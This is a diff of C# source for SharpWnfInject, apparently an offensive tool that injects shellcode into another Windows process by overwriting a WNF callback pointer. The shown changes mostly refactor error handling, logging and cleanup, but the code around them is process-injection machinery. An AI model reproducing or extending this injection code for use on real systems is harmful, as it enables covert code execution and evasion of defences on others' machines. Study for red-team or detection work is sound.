@@ -2,9 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
-using System.Security;
 using SharpWnfInject.Interop;
 
 namespace SharpWnfInject.Library
@@ -20,95 +18,27 @@ namespace SharpWnfInject.Library
             string filePath,
             bool debug)
         {
-            string fullPath;
-            byte[] shellcode;
-
-            try
-            {
-                fullPath = Path.GetFullPath(filePath);
-            }
-            catch (SecurityException ex)
-            {
-                Console.WriteLine("[-] {0}\n", ex.Message);
-
-                return false;
-            }
-            catch (ArgumentNullException ex)
-            {
-                Console.WriteLine("[-] {0}\n", ex.Message);
-
-                return false;
-            }
-            catch (NotSupportedException ex)
-            {
-                Console.WriteLine("[-] {0}\n", ex.Message);
-
-                return false;
-            }
-            catch (PathTooLongException ex)
-            {
-                Console.WriteLine("[-] {0}\n", ex.Message);
-
-                return false;
-            }
+            var bSuccess = false;
+            string fullPath = Path.GetFullPath(filePath);
 
             if (File.Exists(fullPath))
             {
                 try
                 {
-                    shellcode = File.ReadAllBytes(fullPath);
+                    byte[] shellcode = File.ReadAllBytes(fullPath);
+                    bSuccess = InjectShellcode(pid, stateName, shellcode, debug);
                 }
-                catch (ArgumentException ex)
+                catch
                 {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
+                    Console.WriteLine("[-] Failed to read shellcode bytes.");
                 }
-                catch (PathTooLongException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-                catch (DirectoryNotFoundException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-                catch (IOException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-                catch (UnauthorizedAccessException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-                catch (NotSupportedException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-                catch (SecurityException ex)
-                {
-                    Console.WriteLine("[-] {0}\n", ex.Message);
-
-                    return false;
-                }
-
-                return InjectShellcode(pid, stateName, shellcode, debug);
             }
             else
             {
                 Console.WriteLine("[-] Specified file is not exist.\n");
-
-                return false;
             }
+
+            return bSuccess;
         }
 
         public static bool InjectShellcode(
@@ -252,8 +182,8 @@ namespace SharpWnfInject.Library
                 else
                     pCallbackPointer = new IntPtr(pUserSubscription.ToInt32() + (int)nCallbackOffset);
 
-                Console.WriteLine("[*] Target callback pointer is at 0x{0}. Points to 0x{1} ({2}).",
-                    pCallbackPointer.ToString(addressFormat),
+                Console.WriteLine("[*] Target callback pointer is at 0x{0}.", pCallbackPointer.ToString(addressFormat));
+                Console.WriteLine("[*] Callback function is at 0x{0} ({1}).",
                     pSavedCallback.ToString(addressFormat),
                     Helpers.GetSymbolPath(hProcess, pSavedCallback) ?? "N/A");
 
@@ -367,9 +297,6 @@ namespace SharpWnfInject.Library
                     Console.WriteLine("[+] Callback pointer is reverted successfully.");
             } while (false);
 
-            Marshal.FreeHGlobal(pInfoBuffer);
-            NativeMethods.NtClose(hProcess);
-
             if (!bSuccess && (pShellcodeBuffer != IntPtr.Zero))
             {
                 var nRegionSize = SIZE_T.Zero;
@@ -379,6 +306,9 @@ namespace SharpWnfInject.Library
                     ref nRegionSize,
                     ALLOCATION_TYPE.RELEASE);
             }
+
+            Marshal.FreeHGlobal(pInfoBuffer);
+            NativeMethods.NtClose(hProcess);
 
             Console.WriteLine("[*] Done.");
 
